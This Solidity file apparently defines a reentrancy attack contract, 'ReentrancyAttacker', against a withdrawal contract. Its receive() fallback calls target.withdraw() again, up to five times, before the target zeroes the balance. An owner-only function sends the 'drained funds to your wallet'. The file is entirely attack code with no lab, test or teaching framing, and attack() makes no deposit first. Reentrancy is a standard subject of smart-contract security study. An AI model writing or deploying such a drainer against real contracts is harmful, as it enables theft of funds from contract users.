// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWithdrawDAO {
    function withdraw() external;
}

contract ReentrancyAttacker {
    IWithdrawDAO public target;
    uint public attackCount;
    uint constant MAX_ATTACKS = 5;
    address public owner;

    constructor(address _target) {
        target = IWithdrawDAO(_target);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Fallback triggers reentrance
    receive() external payable {
        if (attackCount < MAX_ATTACKS) {
            attackCount++;
            target.withdraw(); // re-enter before balance is zeroed
        }
    }

    function attack() external payable {
        target.withdraw();
    }

    // Withdraw drained funds to your wallet
    function withdraw() external onlyOwner {
        uint balance = address(this).balance;
        require(balance > 0, "Nothing to withdraw");
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Withdraw failed");
    }

    // Change owner if needed
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        owner = newOwner;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}